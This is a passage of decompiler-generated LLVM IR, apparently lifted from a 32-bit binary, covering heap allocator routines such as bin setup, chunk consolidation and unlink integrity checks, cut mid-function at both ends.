  store i32 %v4_8050fd5, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8050fd5, 1
  br i1 %tmp11, label %dec_label_pc_8051033, label %dec_label_pc_8050fdc

dec_label_pc_8050fdc:                             ; preds = %dec_label_pc_8050fae
  %v1_8050fe1 = call i32 @function_8052111(i32 0)
  store i32 %v1_8050fe1, i32* %edi.global-to-local, align 4
  %v0_8050fe8 = load i32, i32* @esi, align 4
  store i32 %v0_8050fe8, i32* %eax.global-to-local, align 4
  %v1_8050fea = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050fea = add i32 %v1_8050fea, 44
  %v3_8050fea = inttoptr i32 %v2_8050fea to i32*
  %v4_8050fea = load i32, i32* %v3_8050fea, align 4
  %v5_8050fea = add i32 %v4_8050fea, %v0_8050fe8
  store i32 %v5_8050fea, i32* %eax.global-to-local, align 4
  %v12_8050ff0 = icmp eq i32 %v1_8050fe1, %v5_8050fea
  %v1_8050ff2 = icmp eq i1 %v12_8050ff0, false
  br i1 %v1_8050ff2, label %dec_label_pc_8051033, label %dec_label_pc_8050ff4

dec_label_pc_8050ff4:                             ; preds = %dec_label_pc_8050fdc
  %v1_8050ff7 = sub i32 0, %v4_8050fd5
  store i32 %v1_8050ff7, i32* @ebx, align 4
  %v1_8050ffa = call i32 @function_8052111(i32 %v1_8050ff7)
  store i32 %v1_8050ffa, i32* %eax.global-to-local, align 4
  %v1_8051006 = call i32 @function_8052111(i32 0)
  store i32 %v1_8051006, i32* %eax.global-to-local, align 4
  %v10_805100e = icmp eq i32 %v1_8051006, -1
  br i1 %v10_805100e, label %dec_label_pc_8051033, label %dec_label_pc_8051013

dec_label_pc_8051013:                             ; preds = %dec_label_pc_8050ff4
  %v0_8051013 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051015 = sub i32 %v0_8051013, %v1_8051006
  %v12_8051015 = icmp eq i32 %v2_8051015, 0
  store i32 %v2_8051015, i32* %ecx.global-to-local, align 4
  br i1 %v12_8051015, label %dec_label_pc_8051033, label %dec_label_pc_8051019

dec_label_pc_8051019:                             ; preds = %dec_label_pc_8051013
  %v0_8051019 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051019 = add i32 %v0_8051019, 44
  %v2_8051019 = inttoptr i32 %v1_8051019 to i32*
  %v3_8051019 = load i32, i32* %v2_8051019, align 4
  store i32 %v3_8051019, i32* %eax.global-to-local, align 4
  %v1_805101c = add i32 %v0_8051019, 872
  %v2_805101c = inttoptr i32 %v1_805101c to i32*
  %v3_805101c = load i32, i32* %v2_805101c, align 4
  %v5_805101c = sub i32 %v3_805101c, %v2_8051015
  store i32 %v5_805101c, i32* %v2_805101c, align 4
  %v0_8051022 = load i32, i32* @esi, align 4
  %v1_8051022 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051022 = sub i32 %v0_8051022, %v1_8051022
  %v1_8051024 = or i32 %v2_8051022, 1
  %v1_8051027 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051027 = add i32 %v1_8051027, 4
  %v3_8051027 = inttoptr i32 %v2_8051027 to i32*
  store i32 %v1_8051024, i32* %v3_8051027, align 4
  br label %dec_label_pc_8051033

dec_label_pc_8051033:                             ; preds = %dec_label_pc_8050fae, %dec_label_pc_8050fdc, %dec_label_pc_8050ff4, %dec_label_pc_8051013, %dec_label_pc_8051019
  %storemerge = phi i32 [ 1, %dec_label_pc_8051019 ], [ 0, %dec_label_pc_8051013 ], [ 0, %dec_label_pc_8050ff4 ], [ 0, %dec_label_pc_8050fdc ], [ 0, %dec_label_pc_8050fae ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8051006, { 1, 0, 2 }
  uselistorder i32 %v4_8050fd5, { 1, 2, 0 }
  uselistorder i32 %v3_8050fb7, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8052111, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8051033, { 4, 3, 2, 1, 0 }
}

define i32 @function_805103b(i32* %arg1) local_unnamed_addr {
dec_label_pc_805103b:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_805103c = load i32, i32* @edi, align 4
  %v0_805103d = load i32, i32* @esi, align 4
  %v0_805103e = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_8051046 = load i32, i32* %arg1, align 4
  store i32 %v2_8051046, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805104d = icmp eq i32 %v2_8051046, 0
  br i1 %v1_805104d, label %dec_label_pc_8051167.lr.ph, label %dec_label_pc_8051055

dec_label_pc_8051167.lr.ph:                       ; preds = %dec_label_pc_805103b
  %v3_805116b = add i32 %tmp20, 44
  br label %dec_label_pc_8051167

dec_label_pc_8051055:                             ; preds = %dec_label_pc_805103b
  %v1_8051059 = and i32 %v2_8051046, -3
  store i32 %v1_8051059, i32* %arg1, align 4
  %v1_805105e = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_8051069 = add i32 %tmp20, 4
  store i32 %v1_8051069, i32* %eax.global-to-local, align 4
  %v2_8051074 = load i32, i32* %arg1, align 4
  %v2_805107a = udiv i32 %v2_8051074, 8
  %v2_805107d = mul nuw i32 %v2_805107a, 4
  %v3_805107d = add i32 %tmp20, -4
  %v4_805107d = add i32 %v3_805107d, %v2_805107d
  store i32 %v4_805107d, i32* %eax.global-to-local, align 4
  %v2_8051144 = add i32 %tmp20, 44
  %v3_8051144 = inttoptr i32 %v2_8051144 to i32*
  %v1_8051117 = add i32 %tmp20, 60
  %v2_8051117 = inttoptr i32 %v1_8051117 to i32*
  br label %dec_label_pc_8051085

dec_label_pc_8051085:                             ; preds = %dec_label_pc_8051153, %dec_label_pc_8051055
  %v0_8051093 = phi i32 [ %v1_8051069, %dec_label_pc_8051055 ], [ %v4_805115d, %dec_label_pc_8051153 ]
  store i32 %v0_8051093, i32* %eax.global-to-local, align 4
  %v1_8051089 = inttoptr i32 %v0_8051093 to i32*
  %v2_8051089 = load i32, i32* %v1_8051089, align 4
  store i32 %v2_8051089, i32* @ecx, align 4
  %v1_805108b = icmp eq i32 %v2_8051089, 0
  br i1 %v1_805108b, label %dec_label_pc_8051153, label %dec_label_pc_8051093

dec_label_pc_8051093:                             ; preds = %dec_label_pc_8051085
  store i32 0, i32* %v1_8051089, align 4
  %v0_8051099.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051099

dec_label_pc_8051099:                             ; preds = %dec_label_pc_8051147, %dec_label_pc_8051093
  %v0_80510b6 = phi i32 [ %v3_8051099, %dec_label_pc_8051147 ], [ %v0_8051099.pre, %dec_label_pc_8051093 ]
  %v1_8051099 = add i32 %v0_80510b6, 8
  %v2_8051099 = inttoptr i32 %v1_8051099 to i32*
  %v3_8051099 = load i32, i32* %v2_8051099, align 4
  store i32 %v3_8051099, i32* %edx.global-to-local, align 4
  %v1_80510a0 = add i32 %v0_80510b6, 4
  %v2_80510a0 = inttoptr i32 %v1_80510a0 to i32*
  %v3_80510a0 = load i32, i32* %v2_80510a0, align 4
  store i32 %v3_80510a0, i32* %eax.global-to-local, align 4
  %v1_80510a5 = and i32 %v3_80510a0, -2
  store i32 %v1_80510a5, i32* @edi, align 4
  %v2_80510a8 = urem i32 %v3_80510a0, 2
  %v3_80510a8 = icmp eq i32 %v2_80510a8, 0
  %v2_80510aa = add i32 %v1_80510a5, %v0_80510b6
  store i32 %v2_80510aa, i32* @ebx, align 4
  %v1_80510ad = add i32 %v2_80510aa, 4
  %v2_80510ad = inttoptr i32 %v1_80510ad to i32*
  %v3_80510ad = load i32, i32* %v2_80510ad, align 4
  store i32 %v3_80510ad, i32* %edx.global-to-local, align 4
  %v1_80510b4 = icmp eq i1 %v3_80510a8, false
  br i1 %v1_80510b4, label %dec_label_pc_80510d6, label %dec_label_pc_80510b6

dec_label_pc_80510b6:                             ; preds = %dec_label_pc_8051099
  %v1_80510b6 = inttoptr i32 %v0_80510b6 to i32*
  %v2_80510b6 = load i32, i32* %v1_80510b6, align 4
  store i32 %v2_80510b6, i32* %ebp.global-to-local, align 4
  %v2_80510ba = sub i32 %v0_80510b6, %v2_80510b6
  store i32 %v2_80510ba, i32* %eax.global-to-local, align 4
  %v1_80510bc = add i32 %v2_80510ba, 8
  %v2_80510bc = inttoptr i32 %v1_80510bc to i32*
  %v3_80510bc = load i32, i32* %v2_80510bc, align 4
  store i32 %v3_80510bc, i32* @esi, align 4
  %v1_80510bf = add i32 %v2_80510ba, 12
  %v2_80510bf = inttoptr i32 %v1_80510bf to i32*
  %v3_80510bf = load i32, i32* %v2_80510bf, align 4
  store i32 %v3_80510bf, i32* %edx.global-to-local, align 4
  %v1_80510c2 = add i32 %v3_80510bc, 12
  %v2_80510c2 = inttoptr i32 %v1_80510c2 to i32*
  %v3_80510c2 = load i32, i32* %v2_80510c2, align 4
  store i32 %v3_80510c2, i32* @ecx, align 4
  %v12_80510c5 = icmp eq i32 %v3_80510c2, %v2_80510ba
  %v1_80510c7 = icmp eq i1 %v12_80510c5, false
  br i1 %v1_80510c7, label %dec_label_pc_8051106, label %dec_label_pc_80510c9

dec_label_pc_80510c9:                             ; preds = %dec_label_pc_80510b6
  %v1_80510c9 = add i32 %v3_80510bf, 8
  %v2_80510c9 = inttoptr i32 %v1_80510c9 to i32*
  %v3_80510c9 = load i32, i32* %v2_80510c9, align 4
  %v15_80510c9 = icmp eq i32 %v3_80510c9, %v3_80510c2
  %v1_80510cc = icmp eq i1 %v15_80510c9, false
  br i1 %v1_80510cc, label %dec_label_pc_8051106, label %dec_label_pc_80510ce

dec_label_pc_80510ce:                             ; preds = %dec_label_pc_80510c9
  %v2_80510ce = add i32 %v2_80510b6, %v1_80510a5
  store i32 %v2_80510ce, i32* @edi, align 4
  store i32 %v3_80510bf, i32* %v2_80510c2, align 4
  %v0_80510d3 = load i32, i32* @esi, align 4
  %v1_80510d3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80510d3 = add i32 %v1_80510d3, 8
  %v3_80510d3 = inttoptr i32 %v2_80510d3 to i32*
  store i32 %v0_80510d3, i32* %v3_80510d3, align 4
  %v0_80510e1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80510d6

dec_label_pc_80510d6:                             ; preds = %dec_label_pc_8051099, %dec_label_pc_80510ce
  %v1_80510ea = phi i32 [ %v2_80510aa, %dec_label_pc_8051099 ], [ %v0_80510e1.pre, %dec_label_pc_80510ce ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80510de = and i32 %v3_80510ad, -4
  store i32 %v1_80510de, i32* %ebp.global-to-local, align 4
  %v4_80510e1 = load i32, i32* %v3_8051144, align 4
  %v15_80510e1 = icmp eq i32 %v1_80510ea, %v4_80510e1
  br i1 %v15_80510e1, label %dec_label_pc_8051137, label %dec_label_pc_80510e6

dec_label_pc_80510e6:                             ; preds = %dec_label_pc_80510d6
  %v2_80510e6 = add i32 %v1_80510ea, 4
  %v3_80510e6 = add i32 %v2_80510e6, %v1_80510de
  %v4_80510e6 = inttoptr i32 %v3_80510e6 to i32*
  %v5_80510e6 = load i32, i32* %v4_80510e6, align 4
  store i32 %v5_80510e6, i32* %eax.global-to-local, align 4
  %v3_80510ea = inttoptr i32 %v2_80510e6 to i32*
  store i32 %v1_80510de, i32* %v3_80510ea, align 4
  %v0_80510ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80510ed = urem i32 %v0_80510ed, 2
  %v2_80510ed = icmp eq i32 %v1_80510ed, 0
  store i32 %v1_80510ed, i32* %eax.global-to-local, align 4
  %v1_80510f2 = icmp eq i1 %v2_80510ed, false
  br i1 %v1_80510f2, label %dec_label_pc_8051113, label %dec_label_pc_80510f4

dec_label_pc_80510f4:                             ; preds = %dec_label_pc_80510e6
  %v0_80510f4 = load i32, i32* @ebx, align 4
  %v1_80510f4 = add i32 %v0_80510f4, 8
  %v2_80510f4 = inttoptr i32 %v1_80510f4 to i32*
  %v3_80510f4 = load i32, i32* %v2_80510f4, align 4
  store i32 %v3_80510f4, i32* @edx, align 4
  %v1_80510f7 = add i32 %v0_80510f4, 12
  %v2_80510f7 = inttoptr i32 %v1_80510f7 to i32*
  %v3_80510f7 = load i32, i32* %v2_80510f7, align 4
  store i32 %v3_80510f7, i32* %eax.global-to-local, align 4
  %v1_80510fa = add i32 %v3_80510f4, 12
  %v2_80510fa = inttoptr i32 %v1_80510fa to i32*
  %v3_80510fa = load i32, i32* %v2_80510fa, align 4
  store i32 %v3_80510fa, i32* @esi, align 4
  %v12_80510fd = icmp eq i32 %v3_80510fa, %v0_80510f4
  %v1_80510ff = icmp eq i1 %v12_80510fd, false
  br i1 %v1_80510ff, label %dec_label_pc_8051106, label %dec_label_pc_8051101

dec_label_pc_8051101:                             ; preds = %dec_label_pc_80510f4
  %v1_8051101 = add i32 %v3_80510f7, 8
  %v2_8051101 = inttoptr i32 %v1_8051101 to i32*
  %v3_8051101 = load i32, i32* %v2_8051101, align 4
  %v15_8051101 = icmp eq i32 %v3_8051101, %v3_80510fa
  br i1 %v15_8051101, label %dec_label_pc_805110b, label %dec_label_pc_8051106

dec_label_pc_8051106:                             ; preds = %dec_label_pc_8051101, %dec_label_pc_80510f4, %dec_label_pc_80510c9, %dec_label_pc_80510b6
  %v0_8051106 = call i32 @function_805137f()
  store i32 %v0_8051106, i32* %eax.global-to-local, align 4
  %v1_805110d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805110b

dec_label_pc_805110b:                             ; preds = %dec_label_pc_8051101, %dec_label_pc_8051106
  %v1_805110d = phi i32 [ %v3_80510f4, %dec_label_pc_8051101 ], [ %v1_805110d.pre, %dec_label_pc_8051106 ]
  %v0_805110d = phi i32 [ %v3_80510f7, %dec_label_pc_8051101 ], [ %v0_8051106, %dec_label_pc_8051106 ]
  %v0_805110b = load i32, i32* @edi, align 4
  %v1_805110b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805110b = add i32 %v1_805110b, %v0_805110b
  store i32 %v2_805110b, i32* @edi, align 4
  %v2_805110d = add i32 %v1_805110d, 12
  %v3_805110d = inttoptr i32 %v2_805110d to i32*
  store i32 %v0_805110d, i32* %v3_805110d, align 4
  %v0_8051110 = load i32, i32* @edx, align 4
  %v1_8051110 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051110 = add i32 %v1_8051110, 8
  %v3_8051110 = inttoptr i32 %v2_8051110 to i32*
  store i32 %v0_8051110, i32* %v3_8051110, align 4
  br label %dec_label_pc_8051113

dec_label_pc_8051113:                             ; preds = %dec_label_pc_80510e6, %dec_label_pc_805110b
  store i32 %v1_805105e, i32* %eax.global-to-local, align 4
  %v3_8051117 = load i32, i32* %v2_8051117, align 4
  store i32 %v3_8051117, i32* @edx, align 4
  %v0_805111a = load i32, i32* @ecx, align 4
  store i32 %v0_805111a, i32* %v2_8051117, align 4
  %v0_805111d = load i32, i32* @edi, align 4
  %v1_805111f = or i32 %v0_805111d, 1
  store i32 %v1_805111f, i32* %eax.global-to-local, align 4
  %v0_8051122 = load i32, i32* @ecx, align 4
  %v1_8051122 = load i32, i32* @edx, align 4
  %v2_8051122 = add i32 %v1_8051122, 12
  %v3_8051122 = inttoptr i32 %v2_8051122 to i32*
  store i32 %v0_8051122, i32* %v3_8051122, align 4
  %v0_8051125 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051125 = load i32, i32* @ecx, align 4
  %v2_8051125 = add i32 %v1_8051125, 4
  %v3_8051125 = inttoptr i32 %v2_8051125 to i32*
  store i32 %v0_8051125, i32* %v3_8051125, align 4
  store i32 %v1_805105e, i32* %eax.global-to-local, align 4
  %v0_805112c = load i32, i32* @edx, align 4
  %v1_805112c = load i32, i32* @ecx, align 4
  %v2_805112c = add i32 %v1_805112c, 8
  %v3_805112c = inttoptr i32 %v2_805112c to i32*
  store i32 %v0_805112c, i32* %v3_805112c, align 4
  %v0_805112f = load i32, i32* %eax.global-to-local, align 4
  %v1_805112f = load i32, i32* @ecx, align 4
  %v2_805112f = add i32 %v1_805112f, 12
  %v3_805112f = inttoptr i32 %v2_805112f to i32*
  store i32 %v0_805112f, i32* %v3_805112f, align 4
  %v0_8051132 = load i32, i32* @edi, align 4
  %v1_8051132 = load i32, i32* @ecx, align 4
  %v3_8051132 = add i32 %v1_8051132, %v0_8051132
  %v4_8051132 = inttoptr i32 %v3_8051132 to i32*
  store i32 %v0_8051132, i32* %v4_8051132, align 4
  br label %dec_label_pc_8051147

dec_label_pc_8051137:                             ; preds = %dec_label_pc_80510d6
  %v0_8051137 = load i32, i32* @edi, align 4
  %v2_8051137 = add i32 %v0_8051137, %v1_80510de
  %v1_805113a = or i32 %v2_8051137, 1
  store i32 %v1_805113a, i32* %eax.global-to-local, align 4
  %v1_805113d = load i32, i32* @ecx, align 4
  %v2_805113d = add i32 %v1_805113d, 4
  %v3_805113d = inttoptr i32 %v2_805113d to i32*
  store i32 %v1_805113a, i32* %v3_805113d, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_8051144 = load i32, i32* @ecx, align 4
  store i32 %v0_8051144, i32* %v3_8051144, align 4
  br label %dec_label_pc_8051147

dec_label_pc_8051147:                             ; preds = %dec_label_pc_8051113, %dec_label_pc_8051137
  store i32 %v3_8051099, i32* @ecx, align 4
  %v1_805114b = icmp eq i32 %v3_8051099, 0
  %v1_805114d = icmp eq i1 %v1_805114b, false
  br i1 %v1_805114d, label %dec_label_pc_8051099, label %dec_label_pc_8051153

dec_label_pc_8051153:                             ; preds = %dec_label_pc_8051147, %dec_label_pc_8051085
  %v15_8051157 = icmp eq i32 %v0_8051093, %v4_805107d
  %v4_805115d = add i32 %v0_8051093, 4
  br i1 %v15_8051157, label %dec_label_pc_80511db, label %dec_label_pc_8051085

dec_label_pc_8051167:                             ; preds = %dec_label_pc_8051167.lr.ph, %dec_label_pc_8051167
  %v1_805116b = phi i32 [ 1, %dec_label_pc_8051167.lr.ph ], [ %v0_8051176, %dec_label_pc_8051167 ]
  %v2_805116b = mul i32 %v1_805116b, 8
  %v4_805116b = add i32 %v3_805116b, %v2_805116b
  store i32 %v4_805116b, i32* %eax.global-to-local, align 4
  %v1_805116f = add i32 %v1_805116b, 1
  store i32 %v1_805116f, i32* %edx.global-to-local, align 4
  %v2_8051170 = add i32 %v4_805116b, 12
  %v3_8051170 = inttoptr i32 %v2_8051170 to i32*
  store i32 %v4_805116b, i32* %v3_8051170, align 4
  %v0_8051173 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051173 = add i32 %v0_8051173, 8
  %v3_8051173 = inttoptr i32 %v2_8051173 to i32*
  store i32 %v0_8051173, i32* %v3_8051173, align 4
  %v0_8051176 = load i32, i32* %edx.global-to-local, align 4
  %v7_8051179 = icmp sgt i32 %v0_8051176, 95
  br i1 %v7_8051179, label %dec_label_pc_805117b, label %dec_label_pc_8051167

dec_label_pc_805117b:                             ; preds = %dec_label_pc_8051167
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_805117f = add i32 %tmp20, 864
  %v2_805117f = inttoptr i32 %v1_805117f to i32*
  %v3_805117f = load i32, i32* %v2_805117f, align 4
  %v4_805117f = or i32 %v3_805117f, 1
  store i32 %v4_805117f, i32* %v2_805117f, align 4
  %v0_8051186 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051186 = add i32 %v0_8051186, 840
  %v2_8051186 = inttoptr i32 %v1_8051186 to i32*
  store i32 0, i32* %v2_8051186, align 4
  %v0_8051190 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051190 = add i32 %v0_8051190, 852
  %v2_8051190 = inttoptr i32 %v1_8051190 to i32*
  store i32 65536, i32* %v2_8051190, align 4
  %v0_805119a = load i32, i32* %eax.global-to-local, align 4
  %v1_805119a = add i32 %v0_805119a, 844
  %v2_805119a = inttoptr i32 %v1_805119a to i32*
  store i32 262144, i32* %v2_805119a, align 4
  %v0_80511a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511a4 = add i32 %v0_80511a4, 836
  %v2_80511a4 = inttoptr i32 %v1_80511a4 to i32*
  store i32 262144, i32* %v2_80511a4, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_80511b5 = load i32, i32* %arg1, align 4
  %v1_80511b7 = urem i32 %v2_80511b5, 4
  %v1_80511ba = or i32 %v1_80511b7, 72
  store i32 %v1_80511ba, i32* %arg1, align 4
  %v0_80511bf = load i32, i32* @edx, align 4
  %v1_80511c1 = add i32 %v0_80511bf, 52
  store i32 %v1_80511c1, i32* %eax.global-to-local, align 4
  %v2_80511c4 = add i32 %v0_80511bf, 44
  %v3_80511c4 = inttoptr i32 %v2_80511c4 to i32*
  store i32 %v1_80511c1, i32* %v3_80511c4, align 4
  %v1_80511c9 = call i32 @function_80517c3(i32 30)
  store i32 %v1_80511c9, i32* %eax.global-to-local, align 4
  %v2_80511d5 = add i32 %tmp20, 860
  %v3_80511d5 = inttoptr i32 %v2_80511d5 to i32*
  store i32 %v1_80511c9, i32* %v3_80511d5, align 4
  br label %dec_label_pc_80511db

dec_label_pc_80511db:                             ; preds = %dec_label_pc_8051153, %dec_label_pc_805117b
  store i32 %v0_805103e, i32* @ebx, align 4
  store i32 %v0_805103d, i32* @esi, align 4
  store i32 %v0_805103c, i32* @edi, align 4
  %v0_80511e2 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80511e2

; uselistorder directives
  uselistorder i32 %v0_8051176, { 1, 0 }
  uselistorder i32 %v0_8051173, { 1, 0 }
  uselistorder i32 %v1_805116b, { 1, 0 }
  uselistorder i32 %v0_8051132, { 1, 0 }
  uselistorder i32 %v1_80510ed, { 1, 0 }
  uselistorder i32 %v2_80510e6, { 1, 0 }
  uselistorder i32 %v1_80510de, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80510ea, { 1, 0 }
  uselistorder i32 %v3_8051099, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80510b6, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8051093, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8051144, { 1, 0 }
  uselistorder i32 %v1_805105e, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_80511db, { 1, 0 }
  uselistorder label %dec_label_pc_8051167, { 1, 0 }
  uselistorder label %dec_label_pc_8051147, { 1, 0 }
  uselistorder label %dec_label_pc_8051113, { 1, 0 }
  uselistorder label %dec_label_pc_805110b, { 1, 0 }
  uselistorder label %dec_label_pc_80510d6, { 1, 0 }
}

define i32 @function_80511e3(i32 %arg1) local_unnamed_addr {
dec_label_pc_80511e3:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80511e3 = load i32, i32* @ebp, align 4
  %v0_80511e4 = load i32, i32* @edi, align 4
  %v0_80511e5 = load i32, i32* @esi, align 4
  %v0_80511e6 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80511ee = icmp eq i32 %arg1, 0
  br i1 %v1_80511ee, label %dec_label_pc_8051377, label %dec_label_pc_80511f6

dec_label_pc_80511f6:                             ; preds = %dec_label_pc_80511e3
  %v2_8051201 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051201, i32* @eax, align 4
  %v2_8051206 = call i32 @function_805194a(i32 %v2_8051201, i32 134551879)
  store i32 %v2_8051206, i32* %eax.global-to-local, align 4
  %v1_8051212 = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  %v1_8051217 = add i32 %arg1, -8
  store i32 %v1_8051217, i32* @ecx, align 4
  %v0_805121a = load i8, i8* @global_var_8053320.32, align 1
  %v1_805121a = sext i8 %v0_805121a to i32
  store i32 %v1_805121a, i32* %eax.global-to-local, align 4
  %v1_8051222 = add i32 %arg1, -4
  %v2_8051222 = inttoptr i32 %v1_8051222 to i32*
  %v3_8051222 = load i32, i32* %v2_8051222, align 4
  %v1_8051227 = and i32 %v3_8051222, -4
  %v4_8051227 = trunc i32 %v1_8051227 to i8
  store i32 %v1_8051227, i32* @ebx, align 4
  %v8_805122c = icmp ugt i8 %v4_8051227, %v0_805121a
  br i1 %v8_805122c, label %dec_label_pc_805124e, label %dec_label_pc_805122e

dec_label_pc_805122e:                             ; preds = %dec_label_pc_80511f6
  %v2_805122e = udiv i32 %v3_8051222, 8
  %v1_8051231 = or i32 %v1_805121a, 3
  %v3_8051231 = trunc i32 %v1_8051231 to i8
  store i32 %v1_8051231, i32* %eax.global-to-local, align 4
  store i8 %v3_8051231, i8* @global_var_8053320.32, align 32
  %v1_8051239 = mul nuw i32 %v2_805122e, 4
  %v2_8051239 = add i32 %v1_8051239, ptrtoint (i8* @global_var_8053320.32 to i32)
  store i32 %v2_8051239, i32* @edx, align 4
  %v1_8051240 = add i32 %v1_8051239, add (i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32 -4)
  %v2_8051240 = inttoptr i32 %v1_8051240 to i32*
  %v3_8051240 = load i32, i32* %v2_8051240, align 4
  store i32 %v3_8051240, i32* %eax.global-to-local, align 4
  %v3_8051243 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8051240, i32* %v3_8051243, align 4
  %v0_8051246 = load i32, i32* @ecx, align 4
  %v1_8051246 = load i32, i32* @edx, align 4
  %v2_8051246 = add i32 %v1_8051246, -4
  %v3_8051246 = inttoptr i32 %v2_8051246 to i32*
  store i32 %v0_8051246, i32* %v3_8051246, align 4
  br label %dec_label_pc_8051366

dec_label_pc_805124e:                             ; preds = %dec_label_pc_80511f6
  %v1_805124e = trunc i32 %v3_8051222 to i8
  %v2_805124e = and i8 %v1_805124e, 2
  %v3_805124e = icmp eq i8 %v2_805124e, 0
  %v5_805124e = zext i8 %v2_805124e to i32
  %v7_805124e = and i32 %v3_8051222, -256
  %v8_805124e = or i32 %v5_805124e, %v7_805124e
  store i32 %v8_805124e, i32* @edx, align 4
  %v1_8051251 = icmp eq i1 %v3_805124e, false
  br i1 %v1_8051251, label %dec_label_pc_8051346, label %dec_label_pc_8051257

dec_label_pc_8051257:                             ; preds = %dec_label_pc_805124e
  %v1_8051257 = or i32 %v1_805121a, 1
  %v3_8051257 = trunc i32 %v1_8051257 to i8
  store i32 %v1_8051257, i32* %eax.global-to-local, align 4
  %v2_805125a = add i32 %v1_8051227, %v1_8051217
  store i32 %v2_805125a, i32* @esi, align 4
  store i8 %v3_8051257, i8* @global_var_8053320.32, align 32
  %v1_8051262 = add i32 %v2_805125a, 4
  %v2_8051262 = inttoptr i32 %v1_8051262 to i32*
  %v3_8051262 = load i32, i32* %v2_8051262, align 4
  store i32 %v3_8051262, i32* %eax.global-to-local, align 4
  %v2_8051269 = inttoptr i32 %v1_8051222 to i8*
  %v3_8051269 = load i8, i8* %v2_8051269, align 1
  %v4_8051269 = urem i8 %v3_8051269, 2
  %v5_8051269 = icmp eq i8 %v4_8051269, 0
  %v1_805126d = icmp eq i1 %v5_8051269, false
  br i1 %v1_805126d, label %dec_label_pc_8051290, label %dec_label_pc_805126f

dec_label_pc_805126f:                             ; preds = %dec_label_pc_8051257
  %v2_805126f = inttoptr i32 %v1_8051217 to i32*
  %v3_805126f = load i32, i32* %v2_805126f, align 4
  store i32 %v3_805126f, i32* @ebp, align 4
  %v2_8051274 = sub i32 %v1_8051217, %v3_805126f
  store i32 %v2_8051274, i32* %eax.global-to-local, align 4
  %v1_8051276 = add i32 %v2_8051274, 8
  %v2_8051276 = inttoptr i32 %v1_8051276 to i32*
  %v3_8051276 = load i32, i32* %v2_8051276, align 4
  store i32 %v3_8051276, i32* @edi, align 4
  %v1_8051279 = add i32 %v2_8051274, 12
  %v2_8051279 = inttoptr i32 %v1_8051279 to i32*
  %v3_8051279 = load i32, i32* %v2_8051279, align 4
  store i32 %v3_8051279, i32* @edx, align 4
  %v1_805127c = add i32 %v3_8051276, 12
  %v2_805127c = inttoptr i32 %v1_805127c to i32*
  %v3_805127c = load i32, i32* %v2_805127c, align 4
  store i32 %v3_805127c, i32* @ecx, align 4
  %v12_805127f = icmp eq i32 %v3_805127c, %v2_8051274
  %v1_8051281 = icmp eq i1 %v12_805127f, false
  br i1 %v1_8051281, label %dec_label_pc_80512bf, label %dec_label_pc_8051283

dec_label_pc_8051283:                             ; preds = %dec_label_pc_805126f
  %v1_8051283 = add i32 %v3_8051279, 8
  %v2_8051283 = inttoptr i32 %v1_8051283 to i32*
  %v3_8051283 = load i32, i32* %v2_8051283, align 4
  %v15_8051283 = icmp eq i32 %v3_8051283, %v3_805127c
  %v1_8051286 = icmp eq i1 %v15_8051283, false
  br i1 %v1_8051286, label %dec_label_pc_80512bf, label %dec_label_pc_8051288

dec_label_pc_8051288:                             ; preds = %dec_label_pc_8051283
  %v2_8051288 = add i32 %v3_805126f, %v1_8051227
  store i32 %v2_8051288, i32* @ebx, align 4
  store i32 %v3_8051279, i32* %v2_805127c, align 4
  %v0_805128d = load i32, i32* @edi, align 4
  %v1_805128d = load i32, i32* @edx, align 4
